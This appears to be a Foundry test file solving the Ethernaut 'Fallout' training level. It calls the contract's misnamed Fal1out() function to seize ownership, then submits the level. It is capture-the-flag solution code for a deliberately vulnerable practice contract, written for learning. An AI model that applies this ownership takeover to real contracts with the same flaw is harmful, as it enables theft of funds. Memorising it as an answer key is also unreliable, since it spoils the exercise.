// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/2-Fallout/FalloutFactory.sol";
import "../src/Ethernaut.sol";

contract FalloutTest is Test {
    Ethernaut ethernaut;
    address eoaAddress = address(100);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(eoaAddress, 5 ether);
    }

    function testFalloutHack() public {
        // Level setup
        FalloutFactory falloutFactory = new FalloutFactory();
        ethernaut.registerLevel(falloutFactory);
        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance(falloutFactory);
        Fallout ethernautFallout = Fallout(payable(levelAddress));

        // Level attack
        emit log_address(ethernautFallout.owner());
        ethernautFallout.Fal1out();
        address newOwner = ethernautFallout.owner();
        emit log_address(newOwner);
        assertEq(newOwner, eoaAddress);

        // Level submission
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress)); 
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}